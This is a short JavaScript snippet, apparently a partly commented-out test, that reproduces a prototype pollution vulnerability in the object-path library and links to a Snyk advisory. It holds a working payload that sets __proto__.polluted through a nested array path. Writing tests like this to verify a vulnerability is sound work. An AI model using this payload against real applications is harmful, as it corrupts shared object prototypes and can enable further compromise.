// //https://security.snyk.io/vuln/SNYK-JS-OBJECTPATH-1569453
// test("prototype pollution in object-path", () => {
  const objectPath = require("object-path");

console.log({}.polluted);
  objectPath.withInheritedProps.set({}, [["__proto__"], "polluted"], "yes");
console.log({}.polluted);
// });
